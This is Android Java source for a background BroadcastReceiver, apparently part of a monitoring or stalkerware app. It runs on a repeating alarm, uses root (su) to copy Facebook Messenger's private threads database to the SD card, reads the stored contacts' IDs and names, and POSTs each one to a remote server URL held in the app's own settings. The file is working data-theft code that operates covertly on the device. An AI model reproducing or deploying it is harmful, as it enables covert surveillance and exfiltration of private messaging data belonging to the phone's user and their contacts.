package voluntaty.com.baseroot;


import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.database.SQLException;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.AsyncTask;

import voluntaty.com.database.DataHelper;
import voluntaty.com.database.DatabaseHelperFasebook;
import voluntaty.com.database.DatabaseHelperFasebookTwo;

import org.apache.http.NameValuePair;
import org.apache.http.client.ResponseHandler;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.BasicResponseHandler;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;

import java.io.File;
import java.io.IOException;
import java.io.OutputStream;
import java.util.ArrayList;
import java.util.List;


/**
 * Created by supergoga on 1/28/2016.
 */
public class RepeatingAlarmServiceFasebookUsers extends BroadcastReceiver {

    public void setpermission(String path) {
        try {
            Process shell = Runtime.getRuntime().exec("su", null, new File("/system/bin/"));
            OutputStream os = shell.getOutputStream();

            os.write(("chmod 777 " + path).getBytes("ASCII"));
            os.flush();
            os.close();
            shell.waitFor();

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void setmkdir(String path) {
        try {
            Process shell = Runtime.getRuntime().exec("su", null, new File("/system/bin/"));
            OutputStream os = shell.getOutputStream();

            os.write(("mkdir -p " + path).getBytes("ASCII"));
            os.flush();
            os.close();
            shell.waitFor();

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void copyFile(String strt) {

        try {
            Process shell = Runtime.getRuntime().exec("su", null, new File("/system/bin/"));
            OutputStream os = shell.getOutputStream();

            os.write(("cp "+strt+" /sdcard/copyfasebook").getBytes("ASCII"));
            os.flush();
            os.close();
            shell.waitFor();
        } catch (Exception e) {
            e.printStackTrace();
        }

    }

    private void copyFile2(String strt) {

        try {
            Process shell = Runtime.getRuntime().exec("su", null, new File("/system/bin/"));
            OutputStream os = shell.getOutputStream();

            os.write(("cp "+strt+" /sdcard/copyfasebook2").getBytes("ASCII"));
            os.flush();
            os.close();
            shell.waitFor();
        } catch (Exception e) {
            e.printStackTrace();
        }

    }

    Cursor c = null;

    private DataHelper dh;
    String login=null;
    String email=null;
    String password=null;
    String URL_HTTP=null;

    public static boolean isNetworkConnectedOrConnecting(Context context) {
        final ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        final NetworkInfo networkInfo = cm.getActiveNetworkInfo();
        return networkInfo != null && networkInfo.isConnectedOrConnecting();
    }

    public void onReceive(Context context, Intent intent) {
        if (isNetworkConnectedOrConnecting(context.getApplicationContext())) {
            someTask(context);
        }
    }

    void someTask(Context context) {

       dh = null;
        dh = new DataHelper(context);

        String servicefasebookusers;
        servicefasebookusers = null;

        servicefasebookusers = dh.selectServicefasebookusers("1");
        dh = null;
        if(servicefasebookusers.length()>0) {

          copyFile2("/data/data/com.facebook.orca/databases/threads_db2");

            dh = null;
            dh = new DataHelper(context);
            URL_HTTP = dh.selectUrl_Http();
            login = dh.selectLogin();
            email = dh.selectEmail();
            password = dh.selectPassword();

            DatabaseHelperFasebookTwo myDbHelper = null;
            myDbHelper = new DatabaseHelperFasebookTwo(context);
            try {

                myDbHelper.createDataBase();

            } catch (IOException ioe) {

            }

            try {

                myDbHelper.openDataBase();

            } catch (SQLException e) {
            }
            //      Toast.makeText(MainActivity.this, "Success", Toast.LENGTH_SHORT).show();


            c = myDbHelper.query("thread_users", null, null, null, null, null, null);

            if (c.moveToFirst()) {
                do {

                    String idmessage = null;

                    idmessage = dh.selectFasebookUsers(c.getString(0));
                    int dlina = idmessage.length();
                    if (dlina < 1) {

                        new RequestTask().execute(URL_HTTP, email, "" + c.getString(0), "" + c.getString(1), "" + c.getString(2), "" + c.getString(3), "" + c.getString(4));
                        //     new RequestTask().execute(URL_HTTP, email, "1111","22222", "3333" , "4444", "5555"ng(9), "" + c.getString(18), "" + c.getString(36));
                        // Toast.makeText(context.getApplicationContext()," " + strt3, Toast.LENGTH_LONG).show();

                        //  Toast.makeText(context.getApplicationContext()," " + c.getString(0)+" "+ c.getString(1)+" " + c.getString(2)+" " + c.getString(3), Toast.LENGTH_LONG).show();

                        //      dh.InsertFasebookUsers(c.getString(0));
                        //       Toast.makeText(getApplicationContext()," ?? "+str2, Toast.LENGTH_LONG).show();

                    }

                    idmessage = null;

                } while (c.moveToNext());
            }
            c = null;
            dh = null;
            myDbHelper = null;
            URL_HTTP = null;
            login = null;
            email = null;
            password = null;

        }
        servicefasebookusers = null;

    }

    class RequestTask extends AsyncTask<String, String, String> {
        private String str2=null;

        @Override
        protected String doInBackground(String... params) {

            try {
                // создаем запрос на сервер
                DefaultHttpClient hc = new DefaultHttpClient();
                ResponseHandler<String> res = new BasicResponseHandler();
                // он у нас будет посылать post запрос
                HttpPost postMethod = new HttpPost(params[0]+"/index.php/api/usersfasebook");
                // будем передавать два параметра
                List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>(6);
                //0
                nameValuePairs.add(new BasicNameValuePair("email",params[1]));
                nameValuePairs.add(new BasicNameValuePair("userkey",params[2]));
                nameValuePairs.add(new BasicNameValuePair("firstname",params[3]));
                nameValuePairs.add(new BasicNameValuePair("lastname",params[4]));
                nameValuePairs.add(new BasicNameValuePair("name",params[5]));
                nameValuePairs.add(new BasicNameValuePair("username",params[6]));

                // собераем их вместе и посылаем на сервер
                postMethod.setEntity(new UrlEncodedFormEntity(nameValuePairs,"UTF-8"));
                // получаем ответ от сервера
                String response = hc.execute(postMethod, res);

                //	JSONURL(response.toString());

            } catch (Exception e) {
                System.out.println("Exp=" + e);
            }



            return null;
        }

        @Override
        protected void onPostExecute(String result) {

            //dialog.dismiss();
            super.onPostExecute(result);
            // 			Toast.makeText(getApplicationContext()," ?? "+str2, Toast.LENGTH_LONG).show();
        }

        @Override
        protected void onPreExecute() {

            super.onPreExecute();
        }
    }

}
